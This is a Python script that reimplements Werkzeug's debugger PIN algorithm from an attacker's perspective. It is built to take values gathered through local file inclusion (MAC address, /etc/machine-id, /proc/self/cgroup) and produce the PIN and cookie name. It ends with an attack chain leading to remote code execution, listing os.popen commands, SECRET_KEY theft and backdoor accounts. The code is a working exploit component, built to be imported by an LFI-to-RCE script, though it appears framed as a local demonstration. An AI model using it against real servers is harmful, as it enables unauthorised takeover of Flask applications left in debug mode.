#!/usr/bin/env python3
"""
Werkzeug 3.x Debug PIN Calculator -- Hacker Perspective
=======================================================

This script can be used in two ways:

  1. STANDALONE -- run directly, calculates PIN from local system files:
         python3 scripts/werkzeug_pin_calc.py

  2. LIBRARY -- import from other scripts:
         from werkzeug_pin_calc import calculate_pin
         pin, cookie = calculate_pin(public_bits, private_bits)

     lfi_to_rce.py uses it exactly like this:
     LFI-collected values are passed to calculate_pin().

Does not call any Werkzeug functions -- only reads system
files and reimplements the open-source PIN algorithm.
"""

import hashlib
import getpass
import os
import sys
from itertools import chain


def banner(text):
    print(f"\n{'=' * 62}")
    print(f"  {text}")
    print(f"{'=' * 62}")


# ──────────────────────────────────────────────
# STEP 1 -- Public Bits
# ──────────────────────────────────────────────
# ALL of these values are visible in the Werkzeug error page stack trace.
# the attacker just needs to trigger an error (e.g. /debug_test) to see them.

def gather_public_bits():
    # 1. username -- extracted from file paths in the stack trace
    #    example: File "/home/potato/project/app.py" -> username is "potato"
    username = getpass.getuser()

    # 2. module name -- always "flask.app" for Flask applications
    modname = "flask.app"

    # 3. app class name -- always "Flask" for Flask applications
    app_name = "Flask"

    # 4. full path to Flask's app.py file on the server
    #    visible in the stack trace:
    #    File "/home/.../site-packages/flask/app.py", line X
    flask_path = None
    for base in sys.path:
        candidate = os.path.join(base, "flask", "app.py")
        if os.path.isfile(candidate):
            flask_path = candidate
            break

    return [username, modname, app_name, flask_path]


# ──────────────────────────────────────────────
# STEP 2 -- Private Bits
# ──────────────────────────────────────────────
# these require a SEPARATE vulnerability to obtain.
# typically Path Traversal / Local File Inclusion (LFI).
# example: GET /download?file=../../../sys/class/net/eth0/address

def read_mac_address():
    """
    the attacker reads this via LFI:
      /sys/class/net/eth0/address  ->  "aa:bb:cc:dd:ee:ff"

    then converts the hex MAC to a decimal integer.
    Werkzeug internally uses uuid.getnode() which reads the same file.
    """
    info = {}

    # method 1: read /sys/class/net/ (what the attacker does via LFI)
    for name in sorted(os.listdir("/sys/class/net/")):
        if name == "lo":
            continue
        path = f"/sys/class/net/{name}/address"
        try:
            with open(path) as f:
                mac_str = f.readline().strip()
            mac_int = int(mac_str.replace(":", ""), 16)
            info["file_method"] = {
                "interface": name,
                "path": path,
                "mac_str": mac_str,
                "mac_int": mac_int,
            }
            break
        except (OSError, ValueError):
            continue

    # method 2: uuid.getnode() -- what Werkzeug actually uses internally
    import uuid
    node = uuid.getnode()
    node_hex = f"{node:012x}"
    node_mac = ":".join(node_hex[i:i+2] for i in range(0, 12, 2))
    info["uuid_method"] = {
        "mac_int": node,
        "mac_str": node_mac,
    }

    return info


def read_machine_id():
    """
    the attacker reads two files via LFI and concatenates them:

      1. /etc/machine-id  (veya /proc/sys/kernel/random/boot_id)
      2. /proc/self/cgroup  ->  ilk satir -> son '/' dan sonrasi
    """
    linux = b""
    sources = {}

    # part 1: machine-id -- unique per installation, persistent across reboots
    for filename in ("/etc/machine-id", "/proc/sys/kernel/random/boot_id"):
        try:
            with open(filename, "rb") as f:
                value = f.readline().strip()
            if value:
                linux += value
                sources["machine_id"] = {
                    "file": filename,
                    "value": value.decode(),
                }
                break
        except OSError:
            continue

    # part 2: cgroup -- differentiates containers on the same host
    try:
        with open("/proc/self/cgroup", "rb") as f:
            raw_line = f.readline().strip()
        cgroup_val = raw_line.rpartition(b"/")[2]
        linux += cgroup_val
        sources["cgroup"] = {
            "file": "/proc/self/cgroup",
            "raw": raw_line.decode(),
            "extracted": cgroup_val.decode() if cgroup_val else "(empty)",
        }
    except OSError:
        sources["cgroup"] = {"file": "/proc/self/cgroup", "raw": "NOT FOUND"}

    return linux, sources


# ──────────────────────────────────────────────
# STEP 3 -- PIN Calculation (SHA-1)
# ──────────────────────────────────────────────
# Werkzeug is open source. The algorithm is on GitHub:
#   pallets/werkzeug -> src/werkzeug/debug/__init__.py

def calculate_pin(public_bits, private_bits):
    h = hashlib.sha1()

    for bit in chain(public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)

    h.update(b"cookiesalt")
    cookie_name = f"__wzd{h.hexdigest()[:20]}"

    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]
    pin = "-".join(num[x : x + 3] for x in range(0, 9, 3))

    return pin, cookie_name


# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────

def main():
    banner("WERKZEUG 3.x DEBUG PIN CALCULATOR")
    print("  Simulating attacker's approach -- no Werkzeug imports used")

    # --- Public bits ---
    banner("STEP 1 -- PUBLIC BITS  (from error page stack trace)")
    public = gather_public_bits()
    labels = ["username", "modname", "app class", "flask path"]
    for label, val in zip(labels, public):
        print(f"  {label:14s}:  {val}")

    # --- Private bits ---
    banner("STEP 2 -- PRIVATE BITS  (require LFI vulnerability)")

    mac_info = read_mac_address()
    machine_id_bytes, mid_sources = read_machine_id()

    if "file_method" in mac_info:
        fm = mac_info["file_method"]
        print(f"  MAC (file)    :  {fm['path']}")
        print(f"                   {fm['mac_str']}  ->  {fm['mac_int']}")

    um = mac_info["uuid_method"]
    print(f"  MAC (uuid)    :  uuid.getnode() = {um['mac_int']}")
    print(f"                   formatted: {um['mac_str']}")

    # Check match
    if "file_method" in mac_info:
        if mac_info["file_method"]["mac_int"] == um["mac_int"]:
            print(f"  STATUS        :  ✓ Both methods match")
            mac_value = str(um["mac_int"])
        else:
            print(f"  STATUS        :  ✗ MISMATCH -- using uuid.getnode()")
            print(f"                   (common in containers/VMs)")
            mac_value = str(um["mac_int"])
    else:
        mac_value = str(um["mac_int"])

    print()
    if "machine_id" in mid_sources:
        mi = mid_sources["machine_id"]
        print(f"  machine-id    :  {mi['file']}")
        print(f"                   {mi['value']}")

    if "cgroup" in mid_sources:
        cg = mid_sources["cgroup"]
        print(f"  cgroup        :  {cg['file']}")
        print(f"                   raw: {cg['raw']}")
        if "extracted" in cg:
            print(f"                   extracted: {cg['extracted']}")

    # --- Calculate ---
    banner("STEP 3 -- PIN CALCULATION  (open-source SHA-1 algorithm)")

    private_bits = [mac_value, machine_id_bytes]
    pin, cookie = calculate_pin(public, private_bits)

    print(f"\n  {'─' * 40}")
    print(f"  CALCULATED PIN  :  {pin}")
    print(f"  COOKIE NAME     :  {cookie}")
    print(f"  {'─' * 40}")

    # --- Verify against Werkzeug ---
    print()
    try:
        from flask import Flask
        _app = Flask(__name__)
        from werkzeug.debug import get_pin_and_cookie_name
        real_pin, real_cookie = get_pin_and_cookie_name(_app)
        if real_pin == pin:
            print(f"  ✓ VERIFIED -- matches Werkzeug's own calculation")
        else:
            print(f"  ✗ Werkzeug says: {real_pin}")
            print(f"    This script  : {pin}")
            print(f"    (Likely a container/VM MAC mismatch)")
        print(f"    Werkzeug PIN : {real_pin}")
    except ImportError:
        print("  (Flask not installed -- cannot auto-verify)")
        print("  Compare manually with terminal output")

    # --- Attack scenario ---
    banner("ATTACK SCENARIO")
    print("""
  A real attacker chains TWO vulnerabilities:

  ┌─────────────────────────────────────────────────┐
  │  VULN 1:  debug=True in production              │
  │  -> Werkzeug error page with stack trace          │
  │  -> Leaks username, file paths, Python version    │
  └──────────────────────┬──────────────────────────┘
                         │
  ┌──────────────────────▼──────────────────────────┐
  │  VULN 2:  Path Traversal / LFI                  │
  │  -> Read /sys/class/net/<iface>/address           │
  │  -> Read /etc/machine-id                          │
  │  -> Read /proc/self/cgroup                        │
  └──────────────────────┬──────────────────────────┘
                         │
  ┌──────────────────────▼──────────────────────────┐
  │  RESULT:  Calculate PIN -> enter in debugger      │
  │  -> os.popen('whoami').read()                     │
  │  -> Read/write any file on the server             │
  │  -> Access database, steal SECRET_KEY             │
  │  -> Create backdoor accounts                      │
  │  -> Full Remote Code Execution                    │
  └─────────────────────────────────────────────────┘

  Neither vulnerability alone is enough:
    • debug=True without LFI  -> PIN blocks console access
    • LFI without debug=True  -> can read files but can't
                                 execute arbitrary code

  Together they give COMPLETE server control.
""")


if __name__ == "__main__":
    main()
